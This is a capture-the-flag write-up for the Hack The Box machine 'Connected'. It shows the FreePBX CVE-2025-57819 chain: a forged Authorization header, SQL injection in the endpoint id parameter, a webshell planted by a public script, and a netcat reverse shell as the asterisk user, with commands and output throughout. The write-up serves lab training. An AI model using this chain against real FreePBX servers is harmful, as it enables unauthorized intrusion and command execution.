# Connected

### Enumeration

I started with an Nmap scan against the target:

```bash
nmap -p22,80,443 10.129.245.100 -Pn -sCV
```

The scan identified three open ports:

```bash
22/tcp  open  ssh       OpenSSH 7.4
80/tcp  open  http      Apache httpd 2.4.6
443/tcp open  ssl/https Apache httpd 2.4.6
```

The HTTP service on port 80 redirected to:

```bash
http://connected.htb/
```

The web server was running:

```bash
Apache 2.4.6
PHP 7.4.16
CentOS
```

The HTTPS service also exposed Apache, and the TLS certificate contained the hostname `pbxconnect`.

I added the hostname to my `/etc/hosts` file:

```bash
10.129.245.100 connected.htb
```

### Web Enumeration

Browsing to `http://connected.htb/` revealed a **FreePBX** installation.

The FreePBX version exposed by the application was:

```bash
FreePBX 16.0.40.7
```

Since the application version was known, I searched for publicly documented vulnerabilities affecting this version.

Two useful sources stood out:

* watchTowr's FreePBX CVE-2025-57819 detection/exploitation research
* Horizon3.ai's research covering FreePBX authentication bypass and SQL injection vulnerabilities

The interesting attack chain involved FreePBX's authentication mechanism and ultimately provided SQL injection that could be leveraged toward remote code execution.

### FreePBX Authentication Bypass / SQL Injection

The research described a vulnerability involving the `webserver` authentication type.

The important behavior was that FreePBX could trust a username supplied through an HTTP `Authorization` header when the relevant authentication configuration was in place.

The forged header used during testing was:

```
Authorization: Basic YWRtaW46YWRtaW4=
```

which corresponds to:

```
admin:admin
```

The vulnerable Endpoint Manager functionality was accessed through:

```
/admin/config.php?display=endpoint&view=customExt
```

Testing the `id` parameter with a quote demonstrated the SQL injection behavior described by the research.

This provided a path from the authentication bypass to SQL injection and eventually arbitrary command execution.

### Exploitation

Rather than manually reproducing the entire exploit chain, I used the publicly available watchTowr detection artifact:

```
watchTowr-vs-FreePBX-CVE-2025-57819.py
```

The script successfully detected that the target was vulnerable and generated a webshell.

The output confirmed:

```
[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found:
http://connected.htb/this-is-an-ioc-not-actually-watchTowr-lht6ih0dxz.php?cmd=hostname
```

At this point I had command execution on the target through the generated webshell.

The script also warned:

```
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
```

This is worth noting because the exploit itself creates a malicious cron-related artifact as part of its execution chain.

### Obtaining a Reverse Shell

With command execution available through the webshell, I started a Netcat listener on my Kali machine:

```
nc -lvnp 4444
```

My HTB VPN address was:

```
10.10.17.238
```

I then used the webshell to execute a Bash reverse shell connecting back to my Kali machine on port 4444.

The connection succeeded:

```
connect to [10.10.17.238] from (UNKNOWN) [10.129.245.100] 41878
```

The resulting shell identified itself as:

```
[asterisk@connected html]$
```

I confirmed that I had landed in the web root:

```
ls
```

which showed:

```
admin
index.php
restapps
robots.txt
this-is-an-ioc-not-actually-watchTowr-lht6ih0dxz.php
```

The reverse shell therefore gave me command execution as the **`asterisk` user**.

### Initial Access

At this point the initial foothold was established:

```
Target: 10.129.245.100
Hostname: connected.htb
Service: FreePBX 16.0.40.7
Initial Access: FreePBX CVE-2025-57819
Shell: Reverse shell
User: asterisk
Working directory: /var/www/html
```

Python was not installed on the target, so the usual Python PTY upgrade was unavailable. However, `script` was present:

```
which script
```

returned:

```
/usr/bin/script
```

This can be used to improve the interactive shell before beginning privilege-escalation enumeration.

The next stage is to enumerate the `asterisk` account and identify a path to root.
